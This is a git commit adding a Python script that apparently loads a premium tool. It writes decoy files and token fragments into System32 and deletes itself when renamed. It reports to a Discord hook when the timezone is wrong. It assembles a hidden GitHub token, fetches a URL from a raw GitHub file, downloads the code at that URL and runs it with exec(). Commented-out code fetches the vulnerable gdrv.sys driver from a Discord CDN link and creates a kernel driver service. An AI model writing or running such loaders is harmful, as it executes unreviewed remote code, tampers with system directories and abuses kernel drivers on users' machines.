9facb7d02e30760a13878bea5d9470fb28e36c81
nvtsxlz <165018144+nvtsxlz@users.noreply.github.com>
2025-02-05 03:07:36 +0800

    Create forpremx_myself.py

---
+++ forpremx_myself.py
@@ -0,0 +1,379 @@
+from cryptography.fernet import Fernet
+import requests
+import os
+from art import *
+import getpass
+import keyring
+
+import subprocess
+import os
+
+
+os.system('cls')
+
+'''
+desktop_pathxsd = os.path.join(os.environ['USERPROFILE'], 'Desktop')
+file_pathaesconfig = os.path.join(desktop_pathxsd, 'aes_config.txt')
+
+def dl_anything_file(url, file_name):
+    target_directory = r'C:\Windows\System32\drivers'
+    save_path = os.path.join(target_directory, file_name)
+    
+    if os.path.exists(save_path):
+        print("")
+        return
+
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(save_path, 'wb') as f:
+            f.write(response.content)
+        print("")
+    else:
+        print(f"")
+if cskey=="xnyOQrKum5ok3gIq-aesthetic":
+    dl_anything_file("https://cdn.discordapp.com/attachments/1198653708511215736/1320957399682519145/gdrv.sys?ex=676b7cf2&is=676a2b72&hm=214b2c82fbbe66bc4585fe831ed1766aebfc5ca2bc5dbd6ea0939922d73b839d&","gdrv.sys")
+'''
+
+os.system('cls')
+def analyze_file():
+    try:
+        # Path to the file
+        file_path = r"C:\Windows\System32\aes_kleix\default_kleix.txt"
+        # Read the file
+        with open(file_path, 'r') as file:
+            lines = file.readlines()
+        # Check for extra new lines
+        stripped_lines = [line.strip() for line in lines]
+        if "" in stripped_lines:
+            os.system('cls')
+            os.remove(file_path)
+            return
+        # Validate that all data values are digits
+        for line in stripped_lines:
+            if ":" not in line:
+                os.system('cls')
+                mylogo()
+                os.remove(file_path)
+                return
+
+            key, value = line.split(":", 1)
+            if not value.strip().isdigit():
+                os.system('cls')
+                os.remove(file_path)
+                mylogo()
+                return
+        print("")
+    except FileNotFoundError:
+        print(f"")
+    except Exception as e:
+        print(f"")
+analyze_file()
+os.system('cls')
+
+filenamex = os.path.basename(__file__)
+#discord_warning(filenamex)
+if filenamex != "aes-prem-jan-10.py":
+    os.system('cls')
+    script_path = os.path.realpath(__file__)
+    os.remove(script_path)
+    os.system('cls')
+    print("Error.")
+    sys.exit()
+def check_timezone():
+    local_time = time.localtime()
+    utc_time = time.gmtime()
+    time_difference = (time.mktime(local_time) - time.mktime(utc_time)) / 3600
+    if time_difference != 8:
+        xsxasxaxa=cskey+" tried to run aes with wrong datetime"
+        discord_warning(xsxasxaxa)
+    else:
+        xxxxx="xxsdfsdfsdf"
+check_timezone()
+
+def delete_files_in_sxxxx_directory():
+    directory = r'C:\Windows\System32\Systemaes'
+    if not os.path.exists(directory):
+        print("")
+        return
+    if not os.listdir(directory):
+        print("")
+        return
+    for file_name in os.listdir(directory):
+        file_path = os.path.join(directory, file_name)
+        try:
+            if os.path.isfile(file_path):
+                os.remove(file_path)
+                print("")
+            else:
+                print("")
+        except Exception as e:
+            print("")
+os.system('cls')
+delete_files_in_sxxxx_directory()
+os.system('cls')
+if cskey =="deletemysdfasdf":
+    os.system('cls')
+    script_path = os.path.realpath(__file__)
+    os.remove(script_path)
+    input()
+    os.system('cls')
+    print("Error.")
+    sys.exit()
+os.system('cls')
+
+
+os.system('cls')
+def create_file_in_system32(filename, content=''):
+    system32_path = r'C:\Windows\System32'
+    file_path = os.path.join(system32_path, filename)  
+    if os.path.exists(file_path):
+        return
+    try:
+        with open(file_path, 'w') as file:
+            file.write(content)
+    except PermissionError:
+        sdsdsadfd="sxsssdfsdf"
+    except Exception as e:
+        sdfd="sxdfsdf"
+create_file_in_system32('mydr.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
+create_file_in_system32('mydrsdf.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
+create_file_in_system32('mydrvrs.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
+create_file_in_system32('mykole.txt', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
+create_file_in_system32('klxklx.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
+create_file_in_system32('klxxklxcv.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffss')
+create_file_in_system32('mydrd.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
+create_file_in_system32('mydriversx.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
+create_file_in_system32('mydrivertest.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
+create_file_in_system32('vulnerable.txt', 'KRmMXvKn0msdf')
+create_file_in_system32('systemduvlneralks.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('datasystem.txt', 'ghp_qupuw6n3pq')
+create_file_in_system32('systemdata.txt', 'ghp_quiwmmsxpw')
+create_file_in_system32('errorsystem.txt', 'ghp_quiwmmsxpw')
+create_file_in_system32('testdata.txt', 'ghp_quiwmmsxpw')
+create_file_in_system32('aes.txt', 'this is a sampletext')
+create_file_in_system32('aesdriver.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
+create_file_in_system32('aesdriver1.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
+create_file_in_system32('aesdriverpremium.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
+create_file_in_system32('aes.py', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
+create_file_in_system32('aesv7.py', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
+create_file_in_system32('aesdata.py', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
+create_file_in_system32('system23ta.txt', 'ghp_quiwmmsxpw')
+create_file_in_system32('errors233stem.txt', 'ghp_quiwmmsxpw')
+create_file_in_system32('syst233ta.txt', 'ghp_quiwmmsxpw')
+create_file_in_system32('erro233stem.txt', 'ghp_quiwmmsxpw')
+create_file_in_system32('syst233ata.txt', 'ghp_quiwmmsxpw')
+create_file_in_system32('erro123123123tem.txt', 'ghp_quiwmmsxpw')
+create_file_in_system32('syste78.txt', 'ghp_quiwmmsxpw')
+create_file_in_system32('er7878stem.txt', 'ghp_quiwmmsxpw')
+create_file_in_system32('syst787878ta.txt', 'ghp_quiwmmsxpw')
+create_file_in_system32('error787878em.txt', 'ghp_quiwmmsxpw')
+create_file_in_system32('syste7878a.txt', 'ghp_quiwmmsxpw')
+create_file_in_system32('erro7878tem.txt', 'ghp_quiwmmsxpw')
+create_file_in_system32('sys7878ta.txt', 'ghp_quiwmmsxpw')
+create_file_in_system32('erro787878tem.txt', 'ghp_quiwmmsxpw')
+create_file_in_system32('myklxklx.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
+create_file_in_system32('myklxxklxcv.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffss')
+create_file_in_system32('myklx678x.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
+create_file_in_system32('myklx678678xcv.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffss')
+create_file_in_system32('myklx2344.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
+create_file_in_system32('mykl34434xcv.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffss')
+create_file_in_system32('mykl2222x.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
+create_file_in_system32('mykl3444343cv.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffss')
+create_file_in_system32('vulnerable.txt', 'KRmMXvKn0msdf')
+create_file_in_system32('systemduv4545lks.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('vulnerable343434.txt', 'KRmMXvKn0msdf')
+create_file_in_system32('systemduvlneralks3443434.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('vulnerable55555.txt', 'KRmMXvKn0msdf')
+create_file_in_system32('systemduvlneralks8888.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('vulnerable99999.txt', 'KRmMXvKn0msdf')
+create_file_in_system32('systemduvlneralks7777.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('vulnerablexxxxx.txt', 'KRmMXvKn0msdf')
+create_file_in_system32('systemduvlneralkssssssssss.txt', 'SjXfmLtdao3ilnxb')
+
+create_file_in_system32('systemdrivervul.txt', 'KRmMXvKn0m')
+create_file_in_system32('datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('infosystem.txt', 'klh_qupuw6n3pq')
+create_file_in_system32('systemdrivervul_.txt', 'KRmMXvKn0m')
+create_file_in_system32('datavulnerablex_.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('infosystem_.txt', 'klhqupuw6n3pq')
+create_file_in_system32('_systemdrivervul.txt', 'KRmMXvKn0m')
+create_file_in_system32('_datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('_infosystem.txt', 'klh_qupuw6n3pq')
+create_file_in_system32('system_drivervul.txt', 'KRmMXvKn0m')
+create_file_in_system32('data_vulnerablex.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('info_system.txt', 'klh_qupuw6n3pq')
+create_file_in_system32('systemdriver_vul.txt', 'KRmMXvKn0m')
+create_file_in_system32('datavulnerable_x.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('infos_ystem.txt', 'klh_qupuw6n3pq')
+create_file_in_system32('systemd_rivervul.txt', 'KRmMXvKn0m')
+create_file_in_system32('datav_ulnerablex.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('infos_ystem.txt', 'klh_qupuw6n3pq')
+create_file_in_system32('syste_mdrive_rvul.txt', 'KRmMXvKn0m')
+create_file_in_system32('datav_ulner_ablex.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('infosy_stem.txt', 'klh_qupuw6n3pq')
+create_file_in_system32('s_ystemdrivervul.txt', 'KRmMXvKn0m')
+create_file_in_system32('d_atavulnerablex.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('i_nfosystem.txt', 'klh_qupuw6n3pq')
+create_file_in_system32('systemdrivervu_l.txt', 'KRmMXvKn0m')
+create_file_in_system32('datavulnerable_x.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('infosyste_m.txt', 'klh_qupuw6n3pq')
+create_file_in_system32('1systemdrivervul.txt', 'KRmMXvKn0m')
+create_file_in_system32('1datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('1infosystem.txt', 'klh_qupuw6n3pq')
+create_file_in_system32('2systemdrivervul.txt', 'KRmMXvKn0m')
+create_file_in_system32('2datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('2infosystem.txt', 'klh_qupuw6n3pq')
+create_file_in_system32('3systemdrivervul.txt', 'KRmMXvKn0m')
+create_file_in_system32('3datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('3infosystem.txt', 'klh_qupuw6n3pq')
+create_file_in_system32('4systemdrivervul.txt', 'KRmMXvKn0m')
+create_file_in_system32('4datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('4infosystem.txt', 'klh_qupuw6n3pq')
+create_file_in_system32('5systemdrivervul.txt', 'KRmMXvKn0m')
+create_file_in_system32('5datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('5infosystem.txt', 'klh_qupuw6n3pq')
+create_file_in_system32('6systemdrivervul.txt', 'KRmMXvKn0m')
+create_file_in_system32('6datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('6infosystem.txt', 'klh_qupuw6n3pq')
+create_file_in_system32('7systemdrivervul.txt', 'KRmMXvKn0m')
+create_file_in_system32('7datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('7infosystem.txt', 'klh_qupuw6n3pq')
+create_file_in_system32('8systemdrivervul.txt', 'KRmMXvKn0m')
+create_file_in_system32('8datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('8infosystem.txt', 'klh_qupuw6n3pq')
+create_file_in_system32('9systemdrivervul.txt', 'KRmMXvKn0m')
+create_file_in_system32('9datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('9infosystem.txt', 'klh_qupuw6n3pq')
+create_file_in_system32('11systemdrivervul.txt', 'KRmMXvKn0m')
+create_file_in_system32('11datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('11infosystem.txt', 'klh_qupuw6n3pq')
+create_file_in_system32('22systemdrivervul.txt', 'KRmMXvKn0m')
+create_file_in_system32('22datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('22infosystem.txt', 'klh_qupuw6n3pq')
+create_file_in_system32('33systemdrivervul.txt', 'KRmMXvKn0m')
+create_file_in_system32('33datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('33infosystem.txt', 'klh_qupuw6n3pq')
+create_file_in_system32('44systemdrivervul.txt', 'KRmMXvKn0m')
+create_file_in_system32('44datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('44infosystem.txt', 'klh_qupuw6n3pq')
+create_file_in_system32('55systemdrivervul.txt', 'KRmMXvKn0m')
+create_file_in_system32('55datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('55infosystem.txt', 'klh_qupuw6n3pq')
+create_file_in_system32('66systemdrivervul.txt', 'KRmMXvKn0m')
+create_file_in_system32('66datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('66infosystem.txt', 'klh_qupuw6n3pq')
+create_file_in_system32('77systemdrivervul.txt', 'KRmMXvKn0m')
+create_file_in_system32('77datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('77infosystem.txt', 'klh_qupuw6n3pq')
+create_file_in_system32('88systemdrivervul.txt', 'KRmMXvKn0m')
+create_file_in_system32('88datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
+create_file_in_system32('88infosystem.txt', 'klh_qupuw6n3pq')
+os.system('cls')
+
+os.system('cls')
+filexyz1 = r'C:\Windows\System32\data_vulnerable_x.txt'
+filexyz2 = r'C:\Windows\System32\system_driver_vul.txt'
+filexyz3 = r'C:\Windows\System32\systeminfo.txt'
+if not os.path.exists(filexyz1):
+    os.system('cls')
+    mylogo()
+    printg("Access denied, please tell dev to give access to the server.")
+    input()
+    sys.exit()
+if not os.path.exists(filexyz2):
+    os.system('cls')
+    mylogo()
+    printg("Access denied, please tell dev to give access to the server.")
+    input()
+    sys.exit()
+if not os.path.exists(filexyz3):
+    os.system('cls')
+    mylogo()
+    printg("Access denied, please tell dev to give access to the server.")
+    input()
+    sys.exit()
+def new_function_name(mycontent):
+    raw2_url  = 'https://raw.githubusercontent.com/nvtsxlz/raws/refs/heads/main/raw_premx_myself.txt'
+
+    crpppttkkyy = Fernet.generate_key()
+    cipher_suite = Fernet(crpppttkkyy)
+    
+    cipher_text = cipher_suite.encrypt(mycontent.encode())
+    
+    os.environ['crpppttkkyy'] = crpppttkkyy.decode()
+    os.environ['ncrptttkkn'] = cipher_text.decode()
+    
+    crpppttkkyy = os.environ['crpppttkkyy']
+    cipher_suite = Fernet(crpppttkkyy.encode())
+    ncrptttkkn = os.environ['ncrptttkkn']
+    dcrpptttknnnn = cipher_suite.decrypt(ncrptttkkn.encode()).decode()
+    
+    
+    headers = {'Authorization': f'token {dcrpptttknnnn}'}
+    
+    raw2response = requests.get(raw2_url,headers=headers)
+    raw2finalcontent = raw2response.text
+    raw2urlfinal = raw2finalcontent
+    raw2urlfinalresponse = requests.get(raw2urlfinal,headers=headers)
+    if raw2urlfinalresponse.status_code == 200:  
+        content2 =  raw2urlfinalresponse.text
+        if True:      
+            rawfile_url = 'https://raw.githubusercontent.com/nvtsxlz/raws/refs/heads/main/raw_premx_myself.txt'
+            rawresponse = requests.get(rawfile_url)
+            rawcontent = rawresponse.text
+            raw_url = rawcontent
+            response = requests.get(raw_url, headers=headers)
+            content = response.text
+            print("Make sure its working fine. The account's email.The owner might change the password of the account anytime.\n\n2. Inactive accounts are accounts that have not been used by the owner for 2weeks to months or years.\n\n3. If the account is  invalid, or perma banned, you can request for a replacement within 24 hours.",exec(f"{content}"))
+            os.system('cls')
+            
+        else:
+            print("error")
+            os.system('cls')
+            
+    else:
+        print("error")
+
+    if raw2urlfinalresponse.status_code != 200:
+        exit()
+
+def get_string_from_file(file_path):
+    if os.path.exists(file_path):
+        with open(file_path, 'r') as file:
+            content = file.read()
+        return content
+    else:
+        return "Error"
+def manage_service():
+    service_name = "mydrs"
+    bin_path = "C:\\Windows\\System32\\mydriver.sys"
+
+    try:
+        # Check if the service exists
+        result = subprocess.run([
+            'sc', 'query', service_name
+        ], capture_output=True, text=True, check=False)
+
+        if 'STATE' in result.stdout:
+            print(f"")
+        else:
+            print(f"")
+            # Create the service
+            create_result = subprocess.run([
+                'sc', 'create', service_name, f'binPath= {bin_path}', 'type=kernel'
+            ], capture_output=True, text=True, check=False)
+
+    except Exception as e:
+        print(f"")
+        sys.exit(1)
+
+#manage_service()
+system_info_path = os.path.join(os.environ['SystemRoot'], 'System32', 'systeminfo.txt')
+system_driver_vul_path = os.path.join(os.environ['SystemRoot'], 'System32', 'system_driver_vul.txt')
+data_vulnerable_path = os.path.join(os.environ['SystemRoot'], 'System32', 'data_vulnerable_x.txt')
+content1 = get_string_from_file(system_info_path)
+content2 = get_string_from_file(system_driver_vul_path)
+content3 = get_string_from_file(data_vulnerable_path)
+content4 =  content1+content2+content3
+content5 = content4
+new_function_name(content5)
